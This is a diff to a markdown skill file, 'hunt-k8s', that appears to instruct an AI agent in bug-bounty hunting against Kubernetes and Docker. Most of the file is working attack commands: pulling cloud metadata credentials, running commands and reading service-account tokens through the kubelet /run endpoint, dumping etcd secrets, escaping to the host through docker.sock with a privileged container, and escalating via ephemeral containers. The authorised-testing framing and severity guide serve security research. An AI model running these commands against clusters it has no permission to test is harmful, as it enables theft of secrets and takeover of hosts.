@@ -1,8 +1,11 @@
 ---
 name: hunt-k8s
 description: "Hunt Kubernetes & Docker — API anonymous access, kubelet 10250 exec (SPDY/WebSocket, NOT plain POST) and the simpler /run primitive, etcd 2379 unauth, dashboard skip-login, RBAC misconfig, secret/SA-token abuse, docker.sock host escape, runc/container-escape (Leaky Vessels CVE-2024-21626), API-server-mediated nodes/proxy RCE, EphemeralContainers node-shell, bound/projected SA-token audience+expiry abuse, admission-controller bypass, Helm/Tiller remnants. Use when target runs containerized infra, exposes K8s ports (6443/10250/10255/2379/8443), or cloud metadata reveals K8s service accounts."
-sources: hackerone_public, cve_database, kubernetes_security_research, portswigger_research
-report_count: 13
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [kubernetes, k8s, hunt, redteam]
 ---
 
 # HUNT-K8S — Kubernetes & Docker Security
@@ -43,16 +46,16 @@ PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010
 nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open
 
 # API server fingerprint — the /version endpoint is anonymous on most clusters
-curl -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
-curl -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
-curl -sk "https://$TARGET:6443/healthz"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:6443/healthz"
 
 # Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
-curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
-TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
-curl -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
-curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" # GKE
+curl --max-time 30 --connect-timeout 10 -s "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
+TOK=$(curl --max-time 30 --connect-timeout 10 -s -X PUT "http://[REDACTED_IP]/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
+curl --max-time 30 --connect-timeout 10 -s -H "X-aws-ec2-metadata-token: $TOK" "http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/"
+curl --max-time 30 --connect-timeout 10 -s "http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
+curl --max-time 30 --connect-timeout 10 -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" # GKE
 ```
 Note the `gitVersion` — it gates every CVE below.
 
@@ -64,25 +67,25 @@ Note the `gitVersion` — it gates every CVE below.
 SRV="https://$TARGET:6443"
 
 # 1. What am I? (anonymous → "system:anonymous")
-curl -sk "$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST \
+curl --max-time 30 --connect-timeout 10 -sk "$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST \
   -H 'Content-Type: application/json' \
   -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'
 
 # 2. What can I actually DO? (the only honest privilege check)
-curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
+curl --max-time 30 --connect-timeout 10 -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
   -H 'Content-Type: application/json' \
   -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
 
 # 3. Targeted access check for the crown-jewel verbs
 for R in secrets pods nodes/proxy pods/exec; do
-  curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -X POST \
+  curl --max-time 30 --connect-timeout 10 -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -X POST \
    -H 'Content-Type: application/json' \
    -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"create\",\"resource\":\"${R%%/*}\",\"subresource\":\"${R#*/}\"}}}" \
    | grep -o '"allowed":[a-z]*' | sed "s#^#$R #"
 done
 
 # 4. Only if access review says allowed — read a real Secret to prove impact
-curl -sk "$SRV/api/v1/secrets" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("items",[])),"secrets")'
+curl --max-time 30 --connect-timeout 10 -sk "$SRV/api/v1/secrets" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("items",[])),"secrets")'
 # decode one value (redact before reporting):
 # echo '<base64>' | base64 -d
 ```
@@ -99,15 +102,15 @@ The earlier version of this skill sent `/exec` as a plain `POST` and expected `i
 SRV="https://$TARGET:10250"
 
 # Enumerate pods (auth varies; many kubelets allow anonymous read here)
-curl -sk "$SRV/pods" | python3 -m json.tool 2>/dev/null \
+curl --max-time 30 --connect-timeout 10 -sk "$SRV/pods" | python3 -m json.tool 2>/dev/null \
   | grep -E '"namespace"|"name"|"containerName"' | head -40
 
 NS=default; POD=target-pod; CTR=app
 
 # --- PRIMITIVE A: /run — returns command output DIRECTLY (no stream handling) ---
 # This is the simple correct primitive. Use this first.
-curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
-curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+curl --max-time 30 --connect-timeout 10 -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
+curl --max-time 30 --connect-timeout 10 -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
 
 # --- PRIMITIVE B: /exec — SPDY/WebSocket stream, NOT a plain POST ---
 # Option 1: kubeletctl handles the stream transport for you (recommended)
@@ -119,11 +122,11 @@ curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernete
 #   websocat -k "wss://$TARGET:10250/cri/exec/<token-from-Location>"
 
 # Container logs (read-only, no stream)
-curl -sk "$SRV/containerLogs/$NS/$POD/$CTR"
+curl --max-time 30 --connect-timeout 10 -sk "$SRV/containerLogs/$NS/$POD/$CTR"
 
 # Read-only kubelet 10255 — INFO DISCLOSURE ONLY, no exec/run. Do not call this "RCE".
-curl -s "http://$TARGET:10255/pods" | python3 -m json.tool 2>/dev/null | head
-curl -s "http://$TARGET:10255/metrics" | head
+curl --max-time 30 --connect-timeout 10 -s "http://$TARGET:10255/pods" | python3 -m json.tool 2>/dev/null | head
+curl --max-time 30 --connect-timeout 10 -s "http://$TARGET:10255/metrics" | head
 ```
 
 **CVE-2020-8558** (host-network trust): on affected kube-proxy, services bound to the node's `127.0.0.1` (incl. the read-only kubelet and other localhost-only services) become reachable from other pods/adjacent hosts via the node IP, defeating the localhost trust boundary — a lateral path to kubelet/etcd that were assumed loopback-only.
@@ -136,14 +139,14 @@ When 10250 is firewalled but you hold a token (even a low-priv pod SA) with `nod
 
 ```bash
 SRV="https://$TARGET:6443"; H="-H \"Authorization: Bearer $TOKEN\""
-NODE=$(curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)
+NODE=$(curl --max-time 30 --connect-timeout 10 -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)
 
 # /run via the node proxy → output comes straight back
-curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST -H "Authorization: Bearer $TOKEN" \
   "$SRV/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR" -d "cmd=id"
 
 # enumerate every pod on a node via the proxy
-curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes/$NODE/proxy/pods"
+curl --max-time 30 --connect-timeout 10 -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes/$NODE/proxy/pods"
 ```
 `nodes/proxy` in any bound role is effectively node-wide RCE. **CVE-2022-3294** (kube-apiserver node-address validation): an authenticated user could redirect the API server's proxy connection to an arbitrary host/IP it could reach (proxy-to-internal SSRF / node impersonation) — relevant whenever you can influence node addresses or use the proxy subresource.
 
@@ -158,11 +161,11 @@ ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \
   get /registry/secrets --prefix 2>/dev/null | strings | grep -Ei 'token|password|tls.key|dockerconfig' | head -40
 
 # HTTP/JSON gateway (key/range are base64; "Lw==" == "/")
-curl -s "http://$TARGET:2379/v3/kv/range" -H 'Content-Type: application/json' \
+curl --max-time 30 --connect-timeout 10 -s "http://$TARGET:2379/v3/kv/range" -H 'Content-Type: application/json' \
   -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHQ=","limit":20}' | python3 -m json.tool
 
 # v2 (older clusters)
-curl -s "http://$TARGET:2379/v2/keys/?recursive=true" | python3 -m json.tool 2>/dev/null | head
+curl --max-time 30 --connect-timeout 10 -s "http://$TARGET:2379/v2/keys/?recursive=true" | python3 -m json.tool 2>/dev/null | head
 ```
 A recovered SA token from etcd → replay against the API server (Phase 6) to confirm grants. **False positive:** a `200` from etcd peer port `2380` or a TLS-required port returning a handshake error is not unauth client access — only a successful `range`/`get` with key data is.
 
@@ -184,17 +187,17 @@ echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m 
 # If aud is e.g. ["vault"] not the api-server audience, it will NOT authenticate to the API → not cluster impact.
 
 # Honest privilege check, then prove with a real read
-curl -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
+curl --max-time 30 --connect-timeout 10 -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
   -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
   -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
-curl -sk "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
+curl --max-time 30 --connect-timeout 10 -sk "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
 ```
 
 **EphemeralContainers node-shell escalation:** with `pods/ephemeralcontainers` (or pod `create`), attach a debug container that shares the host namespaces to escape the pod:
 ```bash
 kubectl debug node/$NODE -it --image=busybox      # mounts host root at /host → chroot /host
 # or patch an ephemeral container with hostPID/privileged via the API:
-curl -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
+curl --max-time 30 --connect-timeout 10 -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
   -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/strategic-merge-patch+json' \
   -d '{"spec":{"ephemeralContainers":[{"name":"x","image":"busybox","command":["sleep","1d"],"securityContext":{"privileged":true}}]}}'
 ```
@@ -205,15 +208,15 @@ curl -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
 
 ```bash
 # docker.sock reachable (SSRF unix://, LFI of socket, or RCE on host)
-curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info
-curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json
+curl --max-time 30 --connect-timeout 10 -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info
+curl --max-time 30 --connect-timeout 10 -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json
 
 # Privileged container bind-mounting host root → read/write host fs (host escape)
-curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
+curl --max-time 30 --connect-timeout 10 -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
   -X POST http://localhost/v1.41/containers/create?name=poc \
   -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
-curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/poc/start
-curl -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/poc/logs?stdout=1"
+curl --max-time 30 --connect-timeout 10 -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/poc/start
+curl --max-time 30 --connect-timeout 10 -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/poc/logs?stdout=1"
 # Impact proof = the NODE's /etc/hostname (differs from the container's hostname).
 ```
 
@@ -228,11 +231,11 @@ curl -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/po
 
 ```bash
 # Kubernetes Dashboard — correct API base is /api/v1/... UNDER the dashboard service.
-curl -sk "https://$TARGET:8443/" | grep -i "kubernetes dashboard"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:8443/" | grep -i "kubernetes dashboard"
 # token-less probe (skip-login or anonymous-bound dashboard SA):
-curl -sk "https://$TARGET:8443/api/v1/secret/default"            # secrets list view
-curl -sk "https://$TARGET:8443/api/v1/pod/default"               # pods list view
-curl -sk "https://$TARGET:8443/api/v1/namespace"                 # namespaces
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:8443/api/v1/secret/default"            # secrets list view
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:8443/api/v1/pod/default"               # pods list view
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET:8443/api/v1/namespace"                 # namespaces
 # (paths are <resource> not <resource>/<id>; a 200 with real items = unauth dashboard data access)
 
 # Helm 2 / Tiller remnant — gRPC on 44134, historically NO auth → full cluster as Tiller's SA
@@ -240,7 +243,7 @@ nmap -p 44134 -sV $TARGET
 # helm --host $TARGET:44134 ls   # if it answers, Tiller is exposed → install/delete any release
 
 # Validating/Mutating admission webhooks — enumerate to find bypassable policy or SSRF-able webhook URLs
-curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations" -H "Authorization: Bearer $TOKEN"
+curl --max-time 30 --connect-timeout 10 -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations" -H "Authorization: Bearer $TOKEN"
 # A webhook clientConfig.url pointing at an external/attacker-influenced host = SSRF/bypass surface.
 ```
 
@@ -288,3 +291,36 @@ curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurati
 - API anon→secret read, kubelet/nodes-proxy RCE, etcd dump, docker.sock/runc escape, CVE-2018-1002105: **Critical**
 - Dashboard token-less data access, exposed Tiller: **High**
 - Read-only kubelet 10255, anon `/version`/`/pods` info disclosure: **Medium**
+
+---
+
+## Verification
+
+Run this self-test to confirm k8s hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-k8s" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **Anonymous kubelet access without pod exec** — read-only kubelet access is recon. Need pod exec, log exfil, or credential access.
+- **etcd without auth but encrypted** — etcd may store encrypted secrets. Test secret decryption before claiming credential theft.
+- **Kubernetes dashboard without login** — the dashboard's skip-login option is a known misconfiguration. Test actual pod exec, not just visibility.
+- **RBAC enumeration without exploitation** — listing roles is informational. Need to demonstrate what the roles allow you to do.
+- **Service account token without cluster-admin** — default service account tokens have limited permissions. Verify the token's actual permissions before claiming cluster takeover.
